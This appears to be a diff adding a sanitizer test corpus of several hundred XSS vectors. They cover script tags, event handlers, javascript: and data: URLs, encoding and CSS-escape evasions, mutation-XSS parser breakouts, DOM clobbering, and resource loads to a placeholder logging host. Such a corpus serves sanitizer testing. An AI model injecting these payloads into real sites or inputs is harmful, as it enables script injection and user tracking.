@@ -1,0 +1,708 @@
+# Our own XSS vectors. Each record starts with "# name"; records are separated by lines of "====".
+# {HOST} stands for the host of a request-logging server. Script vectors call alert(1), which the test page counts.
+# Written from the categories in public evasion lists (the OWASP XSS Filter Evasion Cheat Sheet, the HTML5 Security Cheatsheet,
+# published mutation-XSS research); no text is copied from them.
+# script-plain
+<script>alert(1)</script>
+====
+# script-src-remote
+<script src="http://{HOST}/p/script.js"></script>
+====
+# script-case-mixed
+<ScRiPt>alert(1)</sCrIpT>
+====
+# script-nested-split
+<scr<script>ipt>alert(1)</scr</script>ipt>
+====
+# script-in-tag-lookalike
+<b <script>alert(1)//</script>0</script></b>
+====
+# script-unclosed
+<script>alert(1)
+====
+# script-in-svg
+<svg><script>alert(1)</script></svg>
+====
+# script-in-svg-href
+<svg><script href="data:text/javascript,alert(1)"></script></svg>
+====
+# script-in-math
+<math><mi><script>alert(1)</script></mi></math>
+====
+# script-type-module
+<script type="module">alert(1)</script>
+====
+# img-onerror
+<img src=x onerror=alert(1)>
+====
+# img-onerror-quoted
+<img src="x" onerror="alert(1)">
+====
+# img-onerror-entities
+<img src=x onerror="&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;">
+====
+# img-onerror-slash-separator
+<img/src=x/onerror=alert(1)>
+====
+# img-onload
+<img src="data:image/gif;base64,R0lGODlhAQABAAAAACw=" onload="alert(1)">
+====
+# img-srcset-onerror
+<img srcset=",,,,,x" onerror="alert(1)">
+====
+# img-src-javascript
+<img src="javascript:alert(1)">
+====
+# img-src-javascript-tab
+<img src="java&#9;script:alert(1)">
+====
+# img-src-javascript-newline
+<img src="jav&#x0A;ascript:alert(1)">
+====
+# img-src-javascript-entity-colon
+<img src="javascript&colon;alert(1)">
+====
+# img-src-vbscript
+<img src="vbscript:msgbox(1)">
+====
+# img-dynsrc-lowsrc
+<img dynsrc="javascript:alert(1)" lowsrc="javascript:alert(1)">
+====
+# image-tag-alias
+<image src=x onerror=alert(1)>
+====
+# a-href-javascript
+<a href="javascript:alert(1)">x</a>
+====
+# a-href-javascript-upper
+<a href="JaVaScRiPt:alert(1)">x</a>
+====
+# a-href-javascript-leading-space
+<a href="   javascript:alert(1)">x</a>
+====
+# a-href-javascript-control
+<a href="&#1;javascript:alert(1)">x</a>
+====
+# a-href-javascript-entity-all
+<a href="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;alert(1)">x</a>
+====
+# a-href-javascript-hex-no-semicolon
+<a href="&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A;alert(1)">x</a>
+====
+# a-href-vbscript
+<a href="vbscript:msgbox(1)">x</a>
+====
+# a-href-data-html
+<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">x</a>
+====
+# a-href-data-svg
+<a href="data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+">x</a>
+====
+# a-href-onclick
+<a href="http://example.com/" onclick="alert(1)">x</a>
+====
+# a-onmouseover
+<a href="#" onmouseover="alert(1)">x</a>
+====
+# a-target-opener
+<a href="http://example.com/" target="_blank" rel="opener">x</a>
+====
+# a-backslash-host
+<a href="\\example.com/x">x</a>
+====
+# a-href-file
+<a href="file:///etc/passwd">x</a>
+====
+# a-href-blob
+<a href="blob:http://example.com/1">x</a>
+====
+# a-ping
+<a href="http://example.com/" ping="http://{HOST}/p/ping">x</a>
+====
+# area-href
+<map name=m><area shape=rect coords=0,0,9,9 href="javascript:alert(1)"></map><img usemap="#m" src="data:image/gif;base64,R0lGODlhAQABAAAAACw=">
+====
+# body-onload
+<body onload=alert(1)>
+====
+# body-onpageshow
+<body onpageshow=alert(1)>
+====
+# body-background-javascript
+<body background="javascript:alert(1)">x</body>
+====
+# body-onscroll-autofocus
+<body onscroll=alert(1)><br><br><br><br><input autofocus>
+====
+# table-background
+<table background="javascript:alert(1)"><tr><td>x</td></tr></table>
+====
+# td-background-remote
+<table><tr><td background="http://{HOST}/p/td-bg">x</td></tr></table>
+====
+# frameset-onload
+<frameset onload=alert(1)>
+====
+# iframe-src-javascript
+<iframe src="javascript:alert(1)"></iframe>
+====
+# iframe-srcdoc
+<iframe srcdoc="&lt;script&gt;alert(1)&lt;/script&gt;"></iframe>
+====
+# iframe-src-remote
+<iframe src="http://{HOST}/p/iframe"></iframe>
+====
+# iframe-src-data
+<iframe src="data:text/html,<script>alert(1)</script>"></iframe>
+====
+# frame-src
+<frameset><frame src="javascript:alert(1)"></frameset>
+====
+# object-data
+<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></object>
+====
+# object-data-remote
+<object data="http://{HOST}/p/object"></object>
+====
+# embed-src
+<embed src="javascript:alert(1)">
+====
+# embed-src-remote
+<embed src="http://{HOST}/p/embed">
+====
+# applet
+<applet code="x.class" onerror="alert(1)"></applet>
+====
+# video-onerror
+<video><source onerror="alert(1)"></video>
+====
+# video-poster-javascript
+<video poster="javascript:alert(1)"></video>
+====
+# video-poster-remote
+<video poster="http://{HOST}/p/poster" controls></video>
+====
+# video-src-remote
+<video src="http://{HOST}/p/video" autoplay></video>
+====
+# audio-src-remote
+<audio src="http://{HOST}/p/audio" autoplay onerror="alert(1)"></audio>
+====
+# track-src-remote
+<video><track src="http://{HOST}/p/track" default></video>
+====
+# source-srcset-remote
+<picture><source srcset="http://{HOST}/p/source 2x"><img src="data:image/gif;base64,R0lGODlhAQABAAAAACw="></picture>
+====
+# input-onfocus-autofocus
+<input onfocus=alert(1) autofocus>
+====
+# input-image-src
+<input type=image src="http://{HOST}/p/input-image">
+====
+# form-action-javascript
+<form action="javascript:alert(1)"><input type=submit></form>
+====
+# form-button-formaction
+<form><button formaction="javascript:alert(1)">x</button></form>
+====
+# form-button-outside
+<form id=f></form><button form=f formaction="javascript:alert(1)">x</button>
+====
+# form-remote-action
+<form action="http://{HOST}/p/form" method=post><input name=a value=b><input type=submit></form>
+====
+# select-textarea
+<select><option>a</select><textarea>&lt;script&gt;alert(1)&lt;/script&gt;</textarea>
+====
+# details-ontoggle
+<details open ontoggle="alert(1)">x</details>
+====
+# marquee-onstart
+<marquee onstart=alert(1)>x</marquee>
+====
+# div-onfocus-contenteditable
+<div contenteditable onfocus="alert(1)" autofocus tabindex=0>x</div>
+====
+# div-onanimationstart
+<style>@keyframes x{from{color:red}}</style><div style="animation-name:x" onanimationstart="alert(1)">x</div>
+====
+# div-onmouseover
+<div onmouseover="alert(1)">x</div>
+====
+# div-onclick-uppercase
+<div ONCLICK="alert(1)">x</div>
+====
+# div-on-prefix-odd
+<div onx=alert(1) onfoo="alert(1)">x</div>
+====
+# div-attribute-separators
+<div/onclick=alert(1)>x</div>
+====
+# div-backtick-attr
+<div title=`x` onclick=alert(1)>x</div>
+====
+# link-stylesheet-remote
+<link rel=stylesheet href="http://{HOST}/p/link-css">
+====
+# link-import
+<link rel="import" href="http://{HOST}/p/import.html">
+====
+# link-prefetch
+<link rel="prefetch" href="http://{HOST}/p/prefetch">
+====
+# link-preload-image
+<link rel="preload" as="image" href="http://{HOST}/p/preload">
+====
+# link-prerender
+<link rel=prerender href="http://{HOST}/p/prerender">
+====
+# meta-refresh
+<meta http-equiv="refresh" content="0;url=javascript:alert(1)">
+====
+# meta-refresh-remote
+<meta http-equiv="refresh" content="0;url=http://{HOST}/p/refresh">
+====
+# meta-set-cookie
+<meta http-equiv="set-cookie" content="a=b">
+====
+# base-href
+<base href="http://{HOST}/p/base/"><img src="rel.gif"><a href="x">x</a>
+====
+# base-javascript
+<base href="javascript://"><a href="/.%0a,alert(1)//#">x</a>
+====
+# style-expression
+<div style="width:expression(alert(1))">x</div>
+====
+# style-expression-escaped
+<div style="width:expr\65ssion(alert(1))">x</div>
+====
+# style-expression-fullwidth
+<div style="width:ｅｘｐｒｅｓｓｉｏｎ(alert(1))">x</div>
+====
+# style-behavior
+<div style="behavior:url(http://{HOST}/p/x.htc)">x</div>
+====
+# style-moz-binding
+<div style="-moz-binding:url(http://{HOST}/p/x.xml#a)">x</div>
+====
+# style-js-url
+<div style="background:url(javascript:alert(1))">x</div>
+====
+# style-js-url-escaped
+<div style="background:u\72l(javascript:alert(1))">x</div>
+====
+# style-import-element
+<style>@import url(http://{HOST}/p/import.css);</style>x
+====
+# style-import-string
+<style>@import "http://{HOST}/p/import2.css";</style>x
+====
+# style-import-data
+<style>@import "data:,*%7bx:expression(alert(1))%7d";</style>x
+====
+# style-background-remote-attr
+<div style="background:url(http://{HOST}/p/style-bg)">x</div>
+====
+# style-background-image-remote
+<div style="background-image:url('http://{HOST}/p/style-bgi')">x</div>
+====
+# style-list-style-image
+<ul style="list-style-image:url(http://{HOST}/p/list)"><li>x</li></ul>
+====
+# style-content-url
+<div style="content:url(http://{HOST}/p/content)">x</div>
+====
+# style-cursor-url
+<div style="cursor:url(http://{HOST}/p/cursor),auto">x</div>
+====
+# style-border-image
+<div style="border-image:url(http://{HOST}/p/border-image) 30 round">x</div>
+====
+# style-mask-filter
+<div style="filter:url(http://{HOST}/p/filter#f);mask:url(http://{HOST}/p/mask)">x</div>
+====
+# style-image-set
+<div style="background-image:image-set(url(http://{HOST}/p/set1) 1x, url(http://{HOST}/p/set2) 2x)">x</div>
+====
+# style-var
+<div style="--u:url(http://{HOST}/p/var);background:var(--u)">x</div>
+====
+# style-font-face-remote
+<style>@font-face{font-family:f;src:url(http://{HOST}/p/font.woff)}div{font-family:f}</style><div>x</div>
+====
+# style-element-remote-bg
+<style>.a{background:url(http://{HOST}/p/css-bg)}</style><div class=a>x</div>
+====
+# style-element-body-bg
+<style>body{background:url(http://{HOST}/p/body-bg)}</style>x
+====
+# style-position-fixed
+<div style="position:fixed;top:0;left:0;width:100%;height:100%;z-index:99999;background:white">overlay</div>
+====
+# style-position-fixed-sheet
+<style>div{position:fixed;top:0;left:0;width:9999px;height:9999px}</style><div>overlay</div>
+====
+# style-host-page-restyle
+<style>body,html{display:none!important}a{color:red}#header{display:none}</style>x
+====
+# style-escape-close-tag
+<style>a{font-family:"</style><script>alert(1)</script>"}</style>
+====
+# style-in-body-break
+<style><img src="</style><img src=x onerror=alert(1)//">
+====
+# style-comment-obfuscation
+<style>a{background:u/**/rl(javascript:alert(1))}</style><a>x</a>
+====
+# style-attribute-selector-break
+<style>p[foo=bar{}*{background:url(http://{HOST}/p/sel-break)}{}*{color:red}]{background:green}</style><p>x</p>
+====
+# style-string-newline
+<div style="font-family:'foo
+;background:url(http://{HOST}/p/nl)">x</div>
+====
+# style-unicode-escape-property
+<div style="b\61ckground:url(http://{HOST}/p/prop-esc)">x</div>
+====
+# style-nested-url
+<div style="background:url(url(http://{HOST}/p/nested))">x</div>
+====
+# style-media-query
+<style>@media screen{div{background:url(http://{HOST}/p/media)}}</style><div>x</div>
+====
+# style-supports
+<style>@supports (display:grid){div{background:url(http://{HOST}/p/supports)}}</style><div>x</div>
+====
+# style-namespace
+<style>@namespace svg url(http://www.w3.org/2000/svg);svg|a{color:red}</style>x
+====
+# style-keyframes-url
+<style>@keyframes k{from{background:url(http://{HOST}/p/kf)}}div{animation:k 1s}</style><div>x</div>
+====
+# style-page
+<style>@page{background:url(http://{HOST}/p/page)}</style>x
+====
+# style-charset
+<style>@charset "utf-7";+ADw-script+AD4-alert(1)+ADw-/script+AD4-</style>x
+====
+# style-selector-has-url
+<style>a:has(img[src^="http://{HOST}/p/has"]){color:red}</style><a><img src="x"></a>
+====
+# style-nesting-url
+<style>.a{ & b{background:url(http://{HOST}/p/nest)} }</style><div class=a><b>x</b></div>
+====
+# style-vendor-prefixed
+<div style="-webkit-mask-image:url(http://{HOST}/p/wk-mask);-webkit-box-reflect:below 0 url(http://{HOST}/p/reflect)">x</div>
+====
+# svg-onload
+<svg onload=alert(1)></svg>
+====
+# svg-a-xlink
+<svg><a xlink:href="javascript:alert(1)"><text x=0 y=9>x</text></a></svg>
+====
+# svg-a-href
+<svg><a href="javascript:alert(1)"><text x=0 y=9>x</text></a></svg>
+====
+# svg-animate
+<svg><animate attributeName=href values=javascript:alert(1) /><a id=x><text>x</text></a></svg>
+====
+# svg-set-onmouseover
+<svg><set attributeName="onmouseover" to="alert(1)"/></svg>
+====
+# svg-use-remote
+<svg><use href="http://{HOST}/p/use.svg#a"/></svg>
+====
+# svg-image-remote
+<svg><image href="http://{HOST}/p/svg-image"/></svg>
+====
+# svg-foreignobject
+<svg><foreignObject><iframe src="javascript:alert(1)"></iframe><img src=x onerror=alert(1)></foreignObject></svg>
+====
+# svg-style
+<svg><style>&lt;img src=x onerror=alert(1)//</style></svg>
+====
+# svg-desc-breakout
+<svg></p><style><a id="</style><img src=1 onerror=alert(1)>">
+====
+# svg-title-breakout
+<svg><title><a id="</title><img src=x onerror=alert(1)>"></title></svg>
+====
+# svg-cdata
+<svg><![CDATA[><image xlink:href="]]><img src=xx:x onerror=alert(2)//"></svg>
+====
+# svg-handler
+<svg><handler xmlns:ev="http://www.w3.org/2001/xml-events" ev:event="load">alert(1)</handler></svg>
+====
+# svg-feimage-data
+<svg><filter><feImage href="data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+"/></filter></svg>
+====
+# math-href
+<math href="javascript:alert(1)">x</math>
+====
+# math-maction
+<math><maction actiontype="statusline#http://x" xlink:href="javascript:alert(1)">x</maction></math>
+====
+# math-annotation-xml
+<math><annotation-xml encoding="text/html"><img src=x onerror=alert(1)></annotation-xml></math>
+====
+# mxss-math-mtext-style
+<math><mtext><table><mglyph><style><!--</style><img title="--&gt;&lt;img src=1 onerror=alert(1)&gt;">
+====
+# mxss-math-mi-style
+<math><mi><mglyph><style><!--</style><img title="--&gt;&lt;img src=1 onerror=alert(1)&gt;">
+====
+# mxss-svg-desc-style
+<svg><desc><style><!--</style><img title="--&gt;&lt;img src=1 onerror=alert(1)&gt;">
+====
+# mxss-noscript
+<noscript><p title="</noscript><img src=x onerror=alert(1)>">
+====
+# mxss-noscript-style
+<noscript><style></noscript><img src=x onerror=alert(1)>
+====
+# mxss-form-nesting
+<form><math><mtext></form><form><mglyph><style></math><img src onerror=alert(1)>
+====
+# mxss-table-foster
+<table><a><img src=x onerror=alert(1)></a><td>
+====
+# mxss-table-select
+<table><select><template><img src=x onerror=alert(1)></template></select></table>
+====
+# mxss-template
+<template><script>alert(1)</script><img src=x onerror=alert(1)></template>
+====
+# mxss-xmp
+<xmp><img src=x onerror=alert(1)></xmp>
+====
+# mxss-plaintext
+<plaintext><img src=x onerror=alert(1)>
+====
+# mxss-listing
+<listing><img src=x onerror=alert(1)></listing>
+====
+# mxss-textarea
+<textarea></textarea><img src=x onerror=alert(1)></textarea>
+====
+# mxss-title-breakout
+<title></title><img src=x onerror=alert(1)>
+====
+# mxss-pre-newline
+<pre>
+<img src=x onerror=alert(1)></pre>
+====
+# mxss-comment-breakout
+<!--><img src=x onerror=alert(1)>-->
+====
+# mxss-comment-bang
+<!--!><img src=x onerror=alert(1)>-->
+====
+# mxss-comment-in-attr
+<!--<img src="--><img src=x onerror=alert(1)//">
+====
+# mxss-comment-triple-dash
+<!-- --!><img src=x onerror=alert(1)> -->
+====
+# mxss-bogus-comment
+<? foo="><script>alert(1)</script>">
+====
+# mxss-bogus-bang
+<! foo="><script>alert(1)</script>">
+====
+# mxss-bogus-slash
+</ foo="><script>alert(1)</script>">
+====
+# mxss-percent
+<% foo><x foo="%><script>alert(1)</script>">
+====
+# mxss-cdata-html
+<![CDATA[><script>alert(1)</script>]]>
+====
+# mxss-conditional-comment
+<!--[if gte IE 4]><script>alert(1)</script><![endif]-->
+====
+# mxss-conditional-downlevel
+<![if !IE]><script>alert(1)</script><![endif]>
+====
+# mxss-comment-if-img
+<!--[if<img src=x onerror=alert(2)//]> -->
+====
+# mxss-attribute-entity-lt
+<div title="&lt;img src=x onerror=alert(1)&gt;">x</div>
+====
+# mxss-attribute-quote-entity
+<div title="x&quot; onclick=&quot;alert(1)">x</div>
+====
+# mxss-attribute-backtick
+<div title="``onmouseover=alert(1)">x</div>
+====
+# mxss-attribute-newline-name
+<div
+onclick
+=
+alert(1)
+>x</div>
+====
+# mxss-nested-formatting
+<b><i><u><p></b></i></u><img src=x onerror=alert(1)>
+====
+# mxss-adoption-agency
+<a><table><a><img src=x onerror=alert(1)></a></table></a>
+====
+# mxss-select-option
+<select><option><style></select><img src onerror=alert(1)>
+====
+# mxss-button-p
+<button><p></button><img src onerror=alert(1)>
+====
+# mxss-deep-nesting
+<div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><img src=x onerror=alert(1)>
+====
+# mxss-malformed-end
+<img src=x onerror=alert(1)//
+====
+# mxss-unterminated-attr
+<img src="x onerror=alert(1)>
+====
+# mxss-unterminated-tag
+<img src=x onerror=alert(1)
+====
+# mxss-tag-fragments
+<<script>alert(1)//<</script>
+====
+# mxss-ie-style-attr
+<x '="foo"><x foo='><img src=x onerror=alert(1)//'>
+====
+# mxss-id-clobber
+<img name=body><form id=documentElement></form><a id=defaultView name=defaultView>x</a>
+====
+# mxss-dom-clobber-attributes
+<form><input name=attributes><input name=nodeName></form>
+====
+# encoded-javascript-colon
+<a href="javascript&#58;alert(1)">x</a>
+====
+# encoded-javascript-no-semicolon
+<a href="javascript&#x3A alert(1)">x</a>
+====
+# encoded-javascript-long-zeros
+<a href="&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058alert(1)">x</a>
+====
+# encoded-utf7
+<a href="+ADw-script+AD4-alert(1)+ADw-/script+AD4-">x</a>
+====
+# encoded-data-uri-image-svg
+<img src="data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+">
+====
+# encoded-data-uri-html
+<img src="data:text/html,<script>alert(1)</script>">
+====
+# encoded-data-uri-image-comma
+<img src="data:image/png;base64,AAAA,onerror=alert(1)">
+====
+# encoded-data-uri-charset
+<img src="data:image/png;charset=utf-8;base64,AAAA">
+====
+# encoded-mhtml
+<a href="mhtml:http://{HOST}/p/x.html!xss.html">x</a>
+====
+# encoded-livescript
+<a href="livescript:alert(1)">x</a>
+====
+# encoded-protocol-relative-img
+<img src="//{HOST}/p/protocol-relative">
+====
+# encoded-backslash-img
+<img src="/\{HOST}/p/backslash">
+====
+# encoded-http-no-slashes-img
+<img src="http:{HOST}/p/no-slashes">
+====
+# encoded-http-userinfo-img
+<img src="http://user:pass@{HOST}/p/userinfo">
+====
+# encoded-http-uppercase-img
+<img src="HTTP://{HOST}/p/uppercase">
+====
+# encoded-http-tab-img
+<img src="ht&#9;tp://{HOST}/p/tab">
+====
+# encoded-http-leading-space-img
+<img src="  http://{HOST}/p/space">
+====
+# remote-img
+<img src="http://{HOST}/p/img">
+====
+# remote-img-srcset
+<img srcset="http://{HOST}/p/srcset1 1x, http://{HOST}/p/srcset2 2x" src="data:image/gif;base64,R0lGODlhAQABAAAAACw=">
+====
+# remote-img-srcset-comma-url
+<img srcset="http://{HOST}/p/a,b 1x">
+====
+# remote-img-sizes
+<img src="data:image/gif;base64,R0lGODlhAQABAAAAACw=" srcset="http://{HOST}/p/sizes 100w" sizes="100vw">
+====
+# remote-picture
+<picture><source media="(min-width:1px)" srcset="http://{HOST}/p/picture"><img alt="x"></picture>
+====
+# remote-img-lazy-loading
+<img loading="eager" src="http://{HOST}/p/lazy" decoding="sync" fetchpriority="high">
+====
+# remote-img-data-src
+<img data-src="http://{HOST}/p/data-src" data-srcset="http://{HOST}/p/data-srcset 1x">
+====
+# remote-img-longdesc
+<img longdesc="http://{HOST}/p/longdesc" src="data:image/gif;base64,R0lGODlhAQABAAAAACw=">
+====
+# remote-bgsound
+<bgsound src="http://{HOST}/p/bgsound">
+====
+# remote-body-background
+<body background="http://{HOST}/p/body-background-attr">x</body>
+====
+# remote-body-style-background
+<body style="background-image:url(http://{HOST}/p/body-style)">x</body>
+====
+# remote-svg-image
+<svg width=10 height=10><image xlink:href="http://{HOST}/p/svg-xlink"/></svg>
+====
+# remote-img-lowsrc
+<img lowsrc="http://{HOST}/p/lowsrc" src="data:image/gif;base64,R0lGODlhAQABAAAAACw=">
+====
+# remote-img-dynsrc
+<img dynsrc="http://{HOST}/p/dynsrc">
+====
+# remote-input-src
+<input src="http://{HOST}/p/input-src" type=image>
+====
+# remote-object-codebase
+<object codebase="http://{HOST}/p/codebase" classid="clsid:x"></object>
+====
+# remote-table-background-nested
+<table><tr><td><table background="http://{HOST}/p/nested-table">x</table></td></tr></table>
+====
+# remote-style-escape-url
+<div style="background:\75rl(http://{HOST}/p/escaped-url)">x</div>
+====
+# remote-style-url-uppercase
+<div style="background:URL(http://{HOST}/p/upper)">x</div>
+====
+# remote-style-url-spaces
+<div style="background: url( 'http://{HOST}/p/spaces' )">x</div>
+====
+# remote-style-entities
+<div style="background:url(&quot;http://{HOST}/p/entity&quot;)">x</div>
+====
+# remote-style-protocol-relative
+<div style="background:url(//{HOST}/p/css-protocol-relative)">x</div>
+====
+# remote-style-multiple
+<div style="background:url(http://{HOST}/p/m1),url(http://{HOST}/p/m2)">x</div>
+====
+# remote-style-gradient-fallback
+<div style="background:url(http://{HOST}/p/grad), linear-gradient(red, blue)">x</div>
+====
+# remote-style-bad-url
+<div style="background:url(http://{HOST}/p/bad url with space)">x</div>
